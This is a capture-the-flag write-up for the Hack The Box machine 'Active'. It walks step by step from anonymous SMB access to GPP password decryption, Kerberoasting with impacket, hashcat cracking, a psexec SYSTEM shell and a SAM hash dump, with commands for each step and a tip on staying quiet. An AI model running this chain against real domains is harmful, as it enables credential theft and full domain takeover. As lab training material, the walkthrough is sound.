# Active — Hack The Box

**By Stager** | FashilHack

---

## What is this machine

Active is a Windows Active Directory box built around two of the most important real-world AD attack techniques — **GPP credential exposure** and **Kerberoasting**. The path goes from anonymous SMB access, through a forgotten Group Policy file, to cracking a service account hash and landing as Domain Administrator.

This is not a web exploitation box. There is no login form to attack, no CVE to throw at a service. Everything here is about understanding how Active Directory works and using its own mechanisms against it. The same attack chain appears in real enterprise penetration tests constantly.

---

## Target

```
IP:     10.10.10.1
OS:     Windows Server (Active Directory)
Domain: active.htb
```

---

## Step 1 — Nmap

Started with a full aggressive scan to map out every service running.

```bash
nmap -A -p- -T5 -Pn 10.10.10.1
```



The results confirmed immediately that this is a Domain Controller:

```
PORT     STATE SERVICE
53/tcp   open  DNS
88/tcp   open  Kerberos
135/tcp  open  MSRPC
139/tcp  open  NetBIOS-SSN
389/tcp  open  LDAP
445/tcp  open  SMB
593/tcp  open  HTTP-RPC
636/tcp  open  LDAPS
3268/tcp open  Global Catalog LDAP
3269/tcp open  Global Catalog LDAPS
```

Kerberos on 88, LDAP on 389, SMB on 445. This is the classic Domain Controller port fingerprint. The two most useful ports right now are SMB (445) for file share access and Kerberos (88) for the attack later.

---

## Step 2 — SMB Enumeration (Anonymous Access)

In Active Directory environments, SMB is always the first thing to check. Misconfigurations in file shares are one of the most common ways into a domain. I started with `smbmap` to check if anonymous login gives us access to anything.

```bash
smbmap -H 10.10.10.1
```



A share came back readable without credentials — the `Replication` share had read access for anonymous users. That is already a misconfiguration. Production shares should never be readable without authentication.

Then I used `smbclient` to browse it:

```bash
smbclient -N -L //10.10.10.1
smbclient //10.10.10.1/Replication
```

Inside the share I browsed recursively to see what was stored:

```bash
smbclient //10.10.10.1/Replication -c 'recurse;ls'
```

Buried inside the directory structure was a file called `Groups.xml`. That filename is significant — it is a Group Policy Preferences file and it is the entire entry point for this machine.

```bash
get Groups.xml
```

---

## Step 3 — GPP Credential Extraction

Group Policy Preferences files are created by domain administrators to push configuration settings to machines across the domain. One feature allowed admins to set local account passwords through GPP — and Microsoft stored those passwords encrypted inside `Groups.xml` using AES-256.

The problem is that Microsoft published the decryption key in their own documentation in 2012. Every password stored in a GPP file is now permanently and trivially reversible. Microsoft patched this in MS14-025, but old GPP files left behind on SYSVOL shares still exist in environments that were configured before the patch — and this machine is one of them.

I decrypted the password hash from `Groups.xml` using the tool built for exactly this:

```bash
gpp-decrypt <hash from Groups.xml>
```



This gave us a username and a plaintext password. We now have valid domain credentials.

---

## Step 4 — Credential Validation

Before using these credentials for anything else, I validated them against SMB to confirm they were active:

```bash
netexec smb 10.10.10.1 -u "username" -p "password"
```



The green `[+]` confirmed authentication was successful. We now have a valid domain user. That matters because Kerberoasting — the next step — requires at least one authenticated domain account to work.

---

## Step 5 — Kerberoasting

### What is Kerberoasting

Kerberos is the authentication protocol Active Directory uses. When a user authenticates, they receive a **Ticket Granting Ticket (TGT)**. When they need to access a service, they exchange that TGT for a **Ticket Granting Service ticket (TGS)** for that specific service.

The TGS is encrypted using the password hash of the service account that runs the target service. This is where Kerberoasting comes in — any authenticated domain user can request a TGS for any service account that has a **Service Principal Name (SPN)** registered. You take that encrypted ticket offline and crack it. You are not attacking Kerberos itself. You are cracking the service account's password hash.

### Running the attack

```bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.1 active.htb/username:password
```



The tool returned a hash starting with `$krb5tgs$` — that is the Kerberos TGS hash for the service account. This hash was generated from the service account's password and can now be cracked completely offline without touching the domain controller again.

### Clock skew note

If Kerberos returns a clock skew error, the fix is to sync your time with the DC:

```bash
sudo apt install ntpsec-ntpdate -y
sudo ntpdate 10.10.10.1
```

Kerberos requires the client and server clocks to be within 5 minutes of each other. If your attacker machine time drifts too far, every ticket request will be rejected.

---

## Step 6 — Cracking the Hash

The hash type for Kerberos TGS tickets is mode `13100` in Hashcat. You can identify it by the `$krb5tgs$23$` prefix at the start of the hash.

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

Or with John:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

The crack succeeded and returned the service account's plaintext password. This is the Administrator service account — cracking it means we have full domain admin credentials.

---

## Step 7 — Getting a Shell (psexec)

With Administrator credentials in hand, I used `impacket-psexec` to get a shell. PSExec works over SMB — it uploads a service binary, starts it, and gives you a shell. Ports 139 and 445 are enough for this.

```bash
impacket-psexec active.htb/administrator:password@10.10.10.1
```

Or with `rlwrap` for a better shell experience:

```bash
rlwrap impacket-psexec active.htb/administrator:password@10.10.10.1
```

Shell landed as `NT AUTHORITY\SYSTEM`. Domain is fully compromised.

---

## Step 8 — Dumping Hashes (Optional)

With Administrator access, you can dump all local SAM hashes as a final step:

```bash
netexec smb 10.10.10.1 -u administrator -p password --sam
```

This gives you every local account hash on the machine — useful for further lateral movement or credential reuse across the environment.

---

## Full Attack Chain

```
Nmap → confirmed Domain Controller (DNS, Kerberos, LDAP, SMB)
  ↓
smbmap → anonymous read access on Replication share
  ↓
smbclient → browsed share, found Groups.xml
  ↓
gpp-decrypt → decrypted GPP password → valid domain user credentials
  ↓
netexec smb → validated credentials, confirmed [+] authentication
  ↓
impacket-GetUserSPNs → requested TGS for service account with SPN
  ↓
Received $krb5tgs$ hash (encrypted with service account password)
  ↓
hashcat -m 13100 → cracked hash → Administrator plaintext password
  ↓
impacket-psexec → shell as NT AUTHORITY\SYSTEM
  ↓
Pwned
```

---

## What I Learned

**SMB is always the first door to try in AD.** Anonymous access to file shares is a misconfiguration that still exists in production environments. Before touching any other service, enumerate every share and check what anonymous login can reach.

**GPP files are a permanent vulnerability.** The decryption key is public. Any `Groups.xml` file left on a share is a credential waiting to be read. Even patched environments may have old files sitting in SYSVOL from before MS14-025. Always look for them.

**Kerberoasting requires nothing special — just a valid user.** Any authenticated domain user can request TGS tickets for any service account with an SPN. You do not need to be admin. You do not need special permissions. One low-privilege user is enough to start pulling hashes.

**Service accounts are often over-privileged.** In this case the Kerberoastable account was Administrator. In real environments, service accounts frequently get granted Domain Admin because it was the easy fix at the time. That makes cracking their hashes catastrophic.

**Crack offline, stay quiet.** The entire Kerberoasting attack after the initial TGS request generates no noise on the domain controller. The cracking happens entirely on your machine. No lockouts, no alerts, no logs on the target.

---

## Important Notes

- Kerberoasting only works against accounts with an SPN registered — no SPN means no hash
- AS-REP Roasting is different — it targets accounts with pre-authentication disabled
- PSExec needs ports 139 or 445 — if both are firewalled, try WinRM on 5985 instead
- Always sync your clock before running any Kerberos attack
- GPP passwords are always reversible — gpp-decrypt works on every single one

---

## Screenshots

1. **Nmap scan** — confirming Domain Controller services
2. **smbmap output** — anonymous read on Replication share
3. **Groups.xml** — the file pulled from the share
4. **gpp-decrypt output** — plaintext credentials
5. **netexec validation** — green [+] confirming credentials work
6. **GetUserSPNs output** — TGS hash retrieved
7. **Hashcat crack** — plaintext password recovered
8. **psexec shell** — SYSTEM access confirmed

---

_Stager — PNPT Candidate_ _FashilHack — Simulating Attacks, Securing Businesses._